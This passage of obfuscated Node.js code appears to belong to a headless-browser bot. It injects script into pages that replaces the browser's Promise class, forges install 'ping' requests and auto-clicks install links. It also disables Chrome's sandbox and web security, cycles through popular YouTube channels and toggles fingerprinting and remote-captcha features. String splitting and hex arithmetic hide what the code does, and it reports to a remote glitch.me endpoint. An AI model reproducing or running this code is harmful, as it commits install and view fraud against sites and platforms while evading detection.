-0x4 + 0x13 * -0x349 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x6d + -0x641 * 0x1 + 0x30a * 0x2 ? (this['block'] = P[-0x11db * 0x2 + -0x2262 + 0x4628], this['start'] = N - (0x2 * 0x11a7 + -0xc2d + -0x16e1), this['hash'](), this['hashed'] = -0x1 * 0xb12 + 0x1a98 + -0xf85) : this['start'] = N;
                }
                return this['bytes'] > -0x202c4488 + 0x912513d4 + 0x148925 * 0x6f7 && (this['hBytes'] += this['bytes'] / (-0x1acd15350 + -0x4 * 0x2eda4cd1 + -0x2b12b15 * -0x144) << 0x138e + 0x19e8 + -0x2d76, this['bytes'] = this['bytes'] % (-0x15f85e7fc + -0xdb48050 + -0x1a * -0x17e4b53e)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xe58 * -0x1 + -0x2 * -0xd2c + -0xbff;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x162c + -0x1b8e + 0x31ca] = this['block'], J[K >> 0xdfd * -0x1 + 0x71 * 0x4f + -0x14e0] |= x[0x2 * -0x47 + 0xf9 * 0x1c + -0x1aab & K], this['block'] = J[-0xeaf * 0x1 + 0x1 * 0x60a + 0x8b5], K >= 0x75 * 0x42 + 0x1bb * -0x2 + -0x1a7c && (this['hashed'] || this['hash'](), J[-0x2343 + 0xec1 + 0x19 * 0xd2] = this['block'], J[0x169 * 0x11 + -0x275 * 0xd + 0x1 * 0x808] = J[0xeb7 * -0x2 + 0x8c5 + 0x14aa] = J[-0x1 * -0x17cc + -0x3 * 0x651 + -0x4d7] = J[0x1 * -0x21a1 + 0xa16 * -0x1 + 0x182 * 0x1d] = J[-0x1ebb + 0x3fd * 0x7 + -0x4 * -0xb5] = J[-0x1e30 + -0x11 * -0x1b7 + -0xa * -0x1b] = J[0x1c1b * 0x1 + 0x1ab1 + -0x36c6] = J[0x1de2 + -0x14 * -0x16d + -0x3a5f] = J[0x1148 + 0x29d * -0x5 + 0x99 * -0x7] = J[-0x8af + 0x218c + -0x18d4] = J[0x1769 * 0x1 + 0x308 + 0x2ef * -0x9] = J[-0x151 + -0x1b * -0x64 + -0x2 * 0x498] = J[-0x1401 + -0x10 * 0x3d + -0x29 * -0x95] = J[0x71 * 0x1f + -0x5 * 0x1b1 + -0x1 * 0x52d] = J[0x1baa + 0x8c * -0x1d + -0x2 * 0x5e0] = J[-0x1 * -0x2dd + 0x3e * -0x26 + -0x12 * -0x5b] = 0x8 * -0x45 + 0xa80 + -0x858), J[0xbef + -0x3 * 0x827 + 0xc94] = this['hBytes'] << -0x1 * -0x12f7 + -0x4 * -0x5c3 + -0x2a00 | this['bytes'] >>> 0x2e6 * 0xd + 0x72b * -0x4 + -0x8e5, J[-0xb3 * -0x1 + -0xc34 + 0xb90] = this['bytes'] << -0x1c33 + -0xea4 * -0x1 + 0xd92, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x2015 + 0x89 * -0x43 + 0x3d6; J < -0xad5 + 0x1 * 0x251d + -0xc * 0x22a; ++J)
                K = Q[J - (0x1af9 + 0x50c + -0x2002)] ^ Q[J - (-0xb5e + 0x2429 + -0x18c3)] ^ Q[J - (-0x2 * 0xd08 + -0x74 * -0x4a + -0x76a)] ^ Q[J - (0x5f * 0x65 + 0x13bc + -0x130d * 0x3)], Q[J] = K << 0x2254 + -0x2 * 0x11c + 0x1 * -0x201b | K >>> -0x9da * -0x2 + 0x134e + -0x1 * 0x26e3;
              for (J = -0x193e + -0x245b + 0x3d99; J < 0x903 + 0x44c + -0xd3b * 0x1; J += -0x10c * 0x17 + 0x15a6 + -0x273 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x7c3 * 0x2 + 0x1f24 + -0xf99 | L >>> -0x192 * -0x17 + 0x2c * -0xdf + 0x1 * 0x251) + (M & N | ~M & O) + P + (-0xb * -0xc0a1153 + 0x49d81f5 * -0x16 + -0x5ae * -0xa7eed) + Q[J] << -0x1 * 0x170c + 0x16e * 0x4 + 0x1154) << -0x3ee + 0xb75 + -0x782 | P >>> 0xa93 * -0x2 + -0xad6 * 0x3 + 0x35c3) + (L & (M = M << -0x1713 * 0x1 + -0x2 * 0x8dd + 0x28eb | M >>> -0x71 * -0x21 + 0x1 * 0x10c3 + -0x1f52 * 0x1) | ~L & N) + O + (0xb398bd2d + -0x22 * 0x762da7 + 0x7ea * -0x94607) + Q[J + (-0x59 * 0x6 + 0x1 * 0xdfd + 0xbe6 * -0x1)] << 0x3d4 + 0x2 * -0x11a1 + 0x1f6e) << 0x2445 + 0x75 * -0x11 + -0x1c7b | O >>> 0xd16 + 0x1495 + -0x2190) + (P & (L = L << 0x1f23 + 0x1 * 0x178c + -0xe5 * 0x3d | L >>> -0x1 * -0x263f + 0x1 * -0x212e + -0x50f) | ~P & M) + N + (0x1 * 0x5a1c71c0 + 0x3103ea4f * -0x2 + 0x626ddc77) + Q[J + (-0x21d8 + -0xf7 * -0x1 + 0x1 * 0x20e3)] << 0x1070 * 0x2 + -0x51d * -0x1 + 0x19 * -0x185) << -0x1222 + 0x3 * 0x642 + -0x9f | N >>> -0x14dd + 0xde + -0x53 * -0x3e) + (O & (P = P << -0x10f1 + -0x16d9 + 0x8 * 0x4fd | P >>> 0x1 * -0x1399 + -0x1f56 + 0x32f1) | ~O & L) + M + (-0x52324463 + -0x4158894d + -0x19 * -0x985a6b1) + Q[J + (-0x2191 + -0x5d5 * 0x2 + 0x2d3e)] << 0x727 + -0x76 * -0x3a + 0x5 * -0x6c7) << 0x4b2 + -0x1 * 0x225e + -0x2b3 * -0xb | M >>> -0x170c + 0x4b0 + 0x1277) + (N & (O = O << -0x53 * 0x35 + -0x1f25 + 0x1026 * 0x3 | O >>> -0x6e * 0x17 + -0x1 * 0x7d + 0xa61 * 0x1) | ~N & P) + L + (-0x3a * -0x282b9f2 + -0x7a9fa6be + 0x4383ff83) + Q[J + (0x53a + -0x1132 + 0x5fe * 0x2)] << -0x47f * 0x3 + 0x1 * -0x179f + 0x251c, N = N << -0x1c09 * -0x1 + -0xcd8 + -0xf13 | N >>> -0x23fc + -0x1b40 + -0x2 * -0x1f9f;
              for (; J < -0x1198 + -0x1 * -0x21c9 + -0x1009; J += 0x22fe + 0x6e9 + -0x2 * 0x14f1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2 * 0x8aa + 0x1be2 + -0xa89 | L >>> -0x391 + -0xa * 0x2e3 + 0x1 * 0x208a) + (M ^ N ^ O) + P + (-0x72a8aaa9 + -0x1ace1292 + 0xfc50a8dc) + Q[J] << 0x2a2 * 0xb + -0xad * -0x5 + -0x2057) << -0x1 * 0xddf + 0x1ed6 + -0x3 * 0x5a6 | P >>> -0x11a * -0xf + 0x1 * -0x1101 + 0x96) + (L ^ (M = M << -0x24ee + 0x60 * 0x3 + -0x26 * -0xf2 | M >>> -0xb14 + -0x26f8 + 0x2 * 0x1907) ^ N) + O + (-0x7752 * 0x1c2eb + -0xcd409950 + 0x20e463137) + Q[J + (0x2e * -0x34 + 0x92f * -0x1 + -0x1288 * -0x1)] << -0x1 * -0x1abd + 0x4 * 0x218 + -0x231d) << -0x1 * -0x192e + 0x2c8 + -0x1bf1 | O >>> -0x9a9 * -0x2 + 0x120 * -0x2 + 0x2b * -0x65) + (P ^ (L = L << -0x12f6 + -0x556 + 0x186a | L >>> 0x241f + -0x21a * 0xd + -0x8cb) ^ M) + N + (0x67000362 + -0x17b80f60 + 0x1f91f79f) + Q[J + (0x2 * 0x6d7 + -0x1ac6 + 0x27 * 0x56)] << -0x4a9 + 0x3 * 0x4f4 + -0xa33) << -0x7 * 0x1c1 + -0x33 * -0x37 + 0x157 | N >>> 0x1 * -0xd6f + -0x6a7 * 0x3 + -0x1 * -0x217f) + (O ^ (P = P << 0xd50 + -0x19b1 * 0x1 + 0xc7f | P >>> -0x1647 + 0x38 * -0xe + 0x1959) ^ L) + M + (0xdafa685f * 0x1 + 0x1527e * 0x254c + 0x9d713026 * -0x1) + Q[J + (0x206 + -0x25c6 + 0x727 * 0x5)] << 0x12d7 + -0xb31 + 0x3d3 * -0x2) << -0x19db + -0x253c + 0x3f1c | M >>> -0x1 * -0x18eb + -0xb * -0x109 + -0x2433 * 0x1) + (N ^ (O = O << 0x1 * -0x121 + 0x2e * -0x34 + -0x1 * -0xa97 | O >>> -0x1 * -0x1715 + -0xcbc * -0x2 + 0x11 * -0x2db) ^ P) + L + (0x16ff3b4d * 0x9 + -0xac22e * 0x1173 + 0x5b9b1e96) + Q[J + (-0x20fe + -0x119a + -0x4f * -0xa4)] << -0x247f + -0x80f * -0x3 + 0xc52, N = N << -0xd88 + -0x3 * 0x642 + 0x206c | N >>> -0x97 * 0x29 + -0x5c9 * -0x3 + 0x7 * 0xfa;
              for (; J < -0x19af * -0x1 + 0x74 * -0x11 + -0x11bf; J += -0x1c4f * -0x1 + 0x101e + 0x658 * -0x7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1c36 + 0x3 * -0xcb1 + 0x2127 * 0x2 | L >>> -0x1726 * 0x1 + 0x3e3 * -0x9 + -0x1d1e * -0x2) + (M & N | M & O | N & O) + P - (0x73832f20 + -0x144c92e5 + 0x11ada6e9) + Q[J] << -0x26cc + 0x200 * -0x4 + 0x4 * 0xbb3) << 0x2254 + 0x1151 + 0x70 * -0x76 | P >>> -0x612 + 0x249f + -0x1e72) + (L & (M = M << 0x1835 + 0x41 * -0x14 + -0x1 * 0x1303 | M >>> -0x17c8 + -0xca6 + 0x91c * 0x4) | L & N | M & N) + O - (-0x1846b3 * 0x25 + -0x6bbfad87 + 0x5 * 0x2cd46e82) + Q[J + (0xe54 + -0x20 + -0x1 * 0xe33)] << -0xc40 + -0x321 * -0x4 + -0x44) << 0x1 * -0x13a5 + 0x9 * 0x71 + 0x27 * 0x67 | O >>> -0x2094 + -0xf49 + -0x4 * -0xbfe) + (P & (L = L << 0x256c + -0xb4f * 0x1 + -0x19ff | L >>> -0x28b * 0x2 + -0x60a + 0x1e * 0x5f) | P & M | L & M) + N - (-0x93fb1655 + -0x847354b2 + 0x1119db0d * 0x17) + Q[J + (0xc88 + -0x233 * 0x8 + 0x3b * 0x16)] << 0x25 * 0x49 + 0x64b + -0x58 * 0x31) << 0xd4 + -0x22e7 * 0x1 + 0x2218 | N >>> 0x1 * 0x1237 + -0xf8 + -0x892 * 0x2) + (O & (P = P << -0xc16 + 0x11b * 0x1 + 0xb19 | P >>> -0x1 * 0x1159 + -0x1434 + 0x258f) | O & L | P & L) + M - (0x33299290 * -0x2 + -0x1bd2a672 + 0xb * 0x16182fe2) + Q[J + (0xbb1 * -0x1 + 0xa41 + 0x35 * 0x7)] << -0x1561 + -0x19 * -0x25 + 0x11c4) << 0x358 + -0x121 * 0x7 + -0x125 * -0x4 | M >>> -0x3 * -0x301 + -0x753 + -0x195) + (N & (O = O << -0x23a0 + -0x197c * -0x1 + -0x1a * -0x65 | O >>> 0xf8d + 0x28 + 0x1 * -0xfb3) | N & P | O & P) + L - (0x59b882c4 + 0x7e2f5676 + -0x67039616) + Q[J + (-0x134b + 0x2501 + -0x1e * 0x97)] << -0x671 * 0x1 + 0xa * -0x2c1 + 0x21fb * 0x1, N = N << -0x2046 + -0x12b4 + 0x3318 | N >>> 0x22bf + -0x2359 * -0x1 + -0x4616;
              for (; J < -0x2373 + -0x5 * 0x146 + 0x2cf * 0xf; J += 0x295 * 0x1 + 0x5 * -0x382 + 0x2 * 0x77d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x16de + 0x1 * -0x1f5c + 0x883 * 0x1 | L >>> 0x1 * -0x254d + 0xa39 + 0x1b2f) + (M ^ N ^ O) + P - (-0x261e7 * 0x291a + -0x497a8ca6 + -0x16805f87 * -0xa) + Q[J] << -0x7 + 0x5a3 * -0x6 + -0x6c5 * -0x5) << 0x72e * -0x4 + 0x1ddd + -0x120 | P >>> -0x214b + -0x1 * -0x1021 + -0x1 * -0x1145) + (L ^ (M = M << -0xe90 + 0x128 * -0x1c + 0x2f0e | M >>> -0x1fd0 + 0x1 * -0x10f8 + 0x30ca) ^ N) + O - (-0x1 * 0x12ec786b + -0x646f4784 + -0xc51 * -0xe0b49) + Q[J + (0xd0b + -0x1 * -0xf47 + -0x1c51)] << -0xae4 + 0x1 * -0xbc5 + -0x16a9 * -0x1) << -0x4a3 + 0x1dda + -0x285 * 0xa | O >>> -0xad6 + -0x2de + 0xdcf) + (P ^ (L = L << -0x1e49 + -0x1cf2 + 0x3b59 | L >>> -0x2335 + -0x87 + -0xf * -0x262) ^ M) + N - (-0x4ee5471a * 0x1 + -0x572e0d67 + -0x1 * -0xdbb092ab) + Q[J + (-0x208f + 0x1744 + 0x1 * 0x94d)] << -0x3 * 0xa79 + -0x1 * 0x2363 + 0x2 * 0x2167) << 0x6b * 0x13 + -0x3 * 0x425 + -0xf * -0x4d | N >>> -0x30 * 0xac + -0x265b + 0xa1a * 0x7) + (O ^ (P = P << 0xb * -0x341 + 0xd7 * -0x2d + 0x6a * 0xb2 | P >>> -0x6b6 + 0xa * 0x181 + 0x47 * -0x1e) ^ L) + M - (0x1d64406a + 0x22c4 * 0x7d2b + 0xb8f1e2 * 0xa) + Q[J + (0x1 * 0x233 + 0x1c26 + -0x1 * 0x1e56)] << 0x1e11 + -0x21ea + -0x1 * -0x3d9) << 0xa9f + 0x3df * 0x6 + -0x21d4 | M >>> 0x1e37 + 0x2 * 0x4fd + 0xe * -0x2dd) + (N ^ (O = O << 0x2356 * 0x1 + 0xd7a + -0x30b2 | O >>> 0x1005 + 0x1 * -0x20f + -0xdf4) ^ P) + L - (-0xdb326b * 0x27 + 0x22 * 0x1072011 + 0x340faa35) + Q[J + (-0x20e * 0x7 + -0x1d58 + 0x2bbe)] << -0x14dd + 0x3dd * 0xa + -0x11c5, N = N << 0x2068 + -0xaac + 0x1 * -0x159e | N >>> -0x111e + 0x62d * 0x4 + 0x3ca * -0x2;
              this['h0'] = this['h0'] + L << -0x1 * 0x2ea + 0x1 * -0x1c7 + 0x4b1, this['h1'] = this['h1'] + M << 0x5cf * -0x2 + -0x557 + 0x3 * 0x5a7, this['h2'] = this['h2'] + N << 0x1cf0 + 0xa31 + -0xbd * 0x35, this['h3'] = this['h3'] + O << 0x9 * -0x266 + 0xbf * -0x15 + 0x2541, this['h4'] = this['h4'] + P << -0x7f2 + -0x1c1c + 0x1 * 0x240e;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x5 * -0x9 + 0x158d + -0x1544 & 0x8d7 * -0x2 + -0x1a + 0x11d7] + w[J >> -0x86 * -0x9 + -0xe * -0x1df + -0x1ed0 & -0x1e * -0x19 + 0x1 * -0x17e4 + 0x1505 * 0x1] + w[J >> 0x1 * -0x270c + -0xdcd + -0x11 * -0x31d & 0x1bf * 0x2 + 0x2147 + -0xfe * 0x25] + w[J >> 0x1 * -0x1a11 + 0x2 * 0x58 + -0x1971 * -0x1 & -0x18b1 + -0x1 * 0xd8a + 0x1a * 0x179] + w[J >> 0x1 * 0x226d + 0xc02 + -0x2e63 & -0x3 * 0x39 + -0xd * -0x1a + -0x98] + w[J >> 0x7 * -0x430 + -0x30 + -0xc * -0x276 & -0x1 * -0x2082 + 0x2dc + -0xbc5 * 0x3] + w[J >> 0xc * -0x2e9 + -0x1 * -0x11a7 + 0x1149 & -0x29e * -0x7 + 0x22d1 + -0x3514] + w[0x11a6 + -0x1cc5 + 0xb2e & J] + w[K >> 0x239e + 0x1aec * -0x1 + 0x7 * -0x13a & 0x8 * -0x142 + 0x5 * -0x2b3 + 0x179e] + w[K >> -0x23a0 + -0x9cc + 0x4 * 0xb61 & -0x6a0 + -0x1 * -0x5 + 0x6aa] + w[K >> 0x3 * 0xac9 + -0x1a0d + -0x2 * 0x31d & 0x3 * -0x8ec + -0x2e1 + 0x1db4] + w[K >> 0x9bc + -0x1e9 + -0x7c3 & -0x3 * -0x6d1 + 0x1b * 0xa7 + 0x45 * -0x8d] + w[K >> -0x1725 + -0x103f * -0x1 + 0x6f2 * 0x1 & 0x1479 + -0x2 * 0x765 + -0x60 * 0xf] + w[K >> 0x2 * -0x355 + -0x1 * -0x1af9 + 0x1d * -0xb3 & -0xd19 * 0x1 + -0xaa0 + 0x2 * 0xbe4] + w[K >> -0x50b * 0x5 + -0x119 * 0x9 + 0x118e * 0x2 & 0x1 * 0x898 + -0x13c6 + -0xb3d * -0x1] + w[-0x1ece + 0x2694 + -0x7b7 & K] + w[L >> -0x1f * -0x11 + -0xf84 * -0x1 + -0x1177 & -0x2072 + -0x12ed + 0x336e] + w[L >> 0x13c1 + -0x2170 + -0x1 * -0xdc7 & 0x3 * 0x77f + 0x1d91 + -0x33ff] + w[L >> 0x143 * -0x1d + -0x41 * 0x61 + 0x1ea6 * 0x2 & -0x6e3 + -0x1 * 0x15ee + 0x1ce0] + w[L >> -0x1bcc + -0x6 * -0x2db + -0x2 * -0x55d & 0x2 * -0x11cf + -0x167c + 0x3a29] + w[L >> -0x1 * -0x7d7 + -0x5 * -0x2de + -0x1621 & -0x1 * -0x13c9 + 0xadc + -0x1e96] + w[L >> -0x153c * -0x1 + 0x2594 + -0x3ac8 & -0x1 * 0x1189 + 0x4b5 * -0x8 + 0x3740] + w[L >> 0x1 * -0x13bb + -0x166f + -0x1517 * -0x2 & 0x1c99 * -0x1 + 0x3 * -0x22f + 0x2335] + w[-0x23df + -0x125b + -0x3649 * -0x1 & L] + w[M >> -0xd59 + 0x3 * 0xb5d + 0xa51 * -0x2 & 0x1922 + 0x8c6 + -0x21d9 * 0x1] + w[M >> -0x255c + -0x1 * 0x124a + 0x37be & -0x20ce * 0x1 + -0x3f5 + -0x6 * -0x623] + w[M >> -0x1 * -0x1402 + 0x691 * -0x4 + 0x656 & -0xdcd * 0x1 + -0xb2f * 0x1 + 0x3 * 0x859] + w[M >> -0x1d * -0x11f + 0x1e59 + 0x1f66 * -0x2 & 0x17f0 * 0x1 + -0x10b7 * -0x1 + -0x2898] + w[M >> -0x133 * -0x1 + 0x2477 * 0x1 + 0x141 * -0x1e & -0x10bb * -0x1 + -0x1125 * -0x2 + 0x32f6 * -0x1] + w[M >> 0x227a + -0xb * -0x312 + 0x94 * -0x76 & -0xf2 * 0x19 + 0x2 * 0xe6d + -0x529] + w[M >> 0x20c * 0xb + 0x1df * -0x1 + -0x1 * 0x14a1 & 0x29f * 0x5 + 0x5 * 0x43b + -0x2233] + w[-0x8 * -0x397 + -0x3cb + -0x18de & M] + w[N >> 0x10be * 0x1 + 0x1e85 + -0x2f27 * 0x1 & 0x2f * -0xbf + -0x24db + 0x47fb] + w[N >> 0x1105 * 0x2 + -0x92e * -0x1 + -0x2b20 & -0x156a + 0x15c1 + -0x8 * 0x9] + w[N >> -0x9 * 0x141 + 0x1fbb + 0x6 * -0x365 & -0x21e9 + 0x1 * -0x155 + -0x7 * -0x50b] + w[N >> 0x17d4 + 0x83e + -0x2002 & 0x1d43 + 0x254a + 0x1 * -0x427e] + w[N >> -0x1c4a + -0x13d3 + -0x1 * -0x3029 & 0x1 * 0x1709 + 0x12ea + -0x7 * 0x5fc] + w[N >> 0x97d * -0x1 + -0x4 * -0x730 + -0x9 * 0x223 & 0x12b1 + 0x25fb + -0x389d] + w[N >> -0x22f2 + 0x2110 + 0x1e6 & -0xe2 * 0xb + 0xa6c + -0xa7] + w[0x185f + -0x3 * -0x471 + 0x1 * -0x25a3 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1 * -0x808 + -0x85 * -0x1 + -0x875 & -0x69d + -0x1 * -0x12a5 + -0xb09,
                J >> 0x232c + -0x15c * -0x1 + 0x4 * -0x91e & 0x1 * -0x5de + 0xb + 0x6d2,
                J >> -0x16e0 + -0x1668 + 0x5aa * 0x8 & -0x8a8 + 0x15 * -0x18e + 0x2a4d,
                -0xe7d * 0x1 + 0x445 * -0x3 + -0x1 * -0x1c4b & J,
                K >> 0x770 + 0x430 + 0xf6 * -0xc & 0x2644 + -0x17bf + -0x241 * 0x6,
                K >> 0x2 * 0x5ec + -0x61f + -0x5a9 & 0x220b + -0x6d * -0x4a + 0x408e * -0x1,
                K >> -0x17f7 + 0x3 * 0x12b + -0x56 * -0x3d & 0x11e3 + 0x24d6 + -0x35ba,
                -0xdbf + -0x3bc + 0x127a & K,
                L >> -0x15d * 0x1b + 0xca3 * -0x1 + 0x318a & -0x1f00 + -0x161a + 0xb * 0x4eb,
                L >> -0x1 * 0x112f + 0x90c + 0x833 & 0x2 * 0x52 + 0x4eb + -0x124 * 0x4,
                L >> -0x3 * -0x2f5 + -0x220f + 0x1938 & -0x917 * -0x4 + -0x763 + -0x1bfa,
                0x10d4 + 0x1 * 0x1d3b + -0x2d10 & L,
                M >> -0xab4 + -0x234a + 0x2e16 & -0x2043 + 0x44 * -0x56 + -0x1c0d * -0x2,
                M >> -0x23ee + 0x3 * 0x8a7 + 0xa09 * 0x1 & -0x17f + -0x1cff * 0x1 + 0x1f7d,
                M >> 0x2 * 0xc0c + 0xca * -0x9 + 0x14e * -0xd & 0x1d27 + -0x7 * -0x3d9 + -0x3717,
                0x287 + 0x2298 + -0x2420 & M,
                N >> 0x1f78 + 0x9c7 + 0x23 * -0x12d & -0x1 * -0x4dc + -0x657 + 0x27a,
                N >> 0x1 * 0x16f9 + -0x3eb + -0x12fe & 0x18f5 + -0x1 * 0x149d + -0x359 * 0x1,
                N >> 0x1692 + 0xe8 * 0x24 + -0x372a & -0xffa + 0xf7f * -0x2 + 0x2ff7 * 0x1,
                0x5dd + -0x1 * 0x180f + 0x1331 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1 * 0xa99 + -0x1 * 0x8be + 0x136b), (K = new DataView(J))['setUint32'](-0x3de * -0x1 + -0x1f96 * 0x1 + -0x377 * -0x8, this['h0']), K['setUint32'](-0x1083 * -0x1 + 0x1e0b + -0x2e8a, this['h1']), K['setUint32'](0x20b7 + -0xe98 + -0x1a5 * 0xb, this['h2']), K['setUint32'](-0x128f * 0x2 + 0x1a5 * 0xb + 0x1313, this['h3']), K['setUint32'](0x67 * -0x4f + -0x14bd + 0x3496, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x803 * -0x1 + 0x1 * -0x169f + -0x4 * -0x3a7];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x3 * -0xba9 + -0x1e * -0xfe + 0x1a9 * -0x27;
            J[-0x168 * 0x1 + 0x3 * -0x953 + 0x1d61]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x9 * 0x11f + -0x3 * -0x677 + -0x275 * 0xc] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1 * 0x137d + -0x1 * -0xb5f + -0x3 * 0xa49), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x7 * 0x367 + 0xdec + -0xb5 * -0xe;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x39c * 0x7 + 0x683 * 0x5 + -0x16f * 0x1), Promise['resolve'](0x6c9 * -0x3 + -0x161 * 0xd + 0x2649);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x17f5 + 0x16f9 + -0x2eee; j < -0x4 * 0x825 + -0x49 * -0x85 + -0x558; j++)
    i();
}
const NETWORK_PATIENCE = 0x2588 + -0x3d15 + 0x36cd + (0xc04 + 0xcb * -0xd + 0x1 * 0xa03) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x507 + -0x1098 + 0xad1 * 0x2) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1 * 0x47c + 0x2ec * -0x6 + -0x581 * -0x4);
    let h = e[f];
    return h;
  }, d(b, c);
}

function a() {
  const bj = [
    'nSohamo5bJ9TWO7dLZS',
    'W6hcQr5RW6FdImk4vmoJWRC',
    'EcoPCWC3Uh',
    'W79BqSk/WRSmWR5vnCoD',
    '0\x20(Windows',
    'y29Tp3bHz2u9oq',
    'r1DYmZnFDtbwsW',
    'pathname',
    'write',
    'u2CSW5b3W5aMWRbSBW',
    'pJPQ',
    'zgL1Bs5JB20VzW',
    'vGylWORdMML+W6ZdG0m',
    'ienOCM9Tzs8Xma',
    'Ahr0Chm6lY9ZBW',
    'CNbYAw50',
    'WO93WQdcRmo9WOy/W7NdG8ow',
    'vfe2ovfgCw1IBW',
    'zwfZEwzVCMSUBW',
    'a-commenta',
    'sJn5z2veru1UtW',
    'l8obW7LhWRPuWPdcUc3dGa',
    'kSkLWR0UrhVdUCoIEGm',
    '618288174b',
    'lCoormkXdNLM',
    'pts/by-sit',
    'r0vu'
  ];
  a = function() {
    return bj;
  };
  return a();
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xff1 + -0x23cf + 0x2 * 0x9ef; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
